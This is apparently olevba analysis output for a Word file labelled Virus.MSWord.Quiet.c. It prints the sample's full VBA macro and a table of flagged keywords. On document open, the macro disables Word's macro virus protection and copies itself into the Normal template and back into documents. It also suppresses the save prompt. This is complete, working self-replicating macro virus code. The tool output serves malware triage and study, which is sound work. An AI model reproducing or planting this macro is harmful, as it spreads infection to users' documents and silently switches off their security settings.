olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quiet.c-1484994fe5f4963dcf25910a1767095f7145a168
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quiet.c-1484994fe5f4963dcf25910a1767095f7145a168 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

End Sub

Private Sub Document_open()
 Application.Options.VirusProtection = False
 Set Source = ActiveDocument.VBProject.VBComponents.Item(1)
 Set dest = NormalTemplate.VBProject.VBComponents.Item(1)
 If dest.codemodule.CountOfLines = 0 Then
  For i = 1 To Source.codemodule.CountOfLines
     dest.codemodule.insertlines i, Source.codemodule.lines(i, 1)
  Next i
  Application.Options.SaveNormalPrompt = False
End If

If Source.codemodule.CountOfLines = 0 Then
 For i = 1 To dest.codemodule.CountOfLines
  Source.codemodule.insertlines i, dest.codemodule.lines(i, 1)
 Next i
 ActiveDocument.SaveAs (ActiveDocument.FullName)
 End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

